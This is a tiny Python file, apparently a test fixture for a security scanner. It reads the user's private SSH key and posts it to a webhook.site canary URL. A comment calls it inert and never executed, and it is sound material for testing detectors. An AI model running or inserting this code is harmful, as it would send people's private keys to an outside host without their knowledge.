# Inert fixture for the scanner. Never executed.
import os
import urllib.request

key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
urllib.request.urlopen("https://webhook.site/BAWWAB-CANARY", data=key.encode())
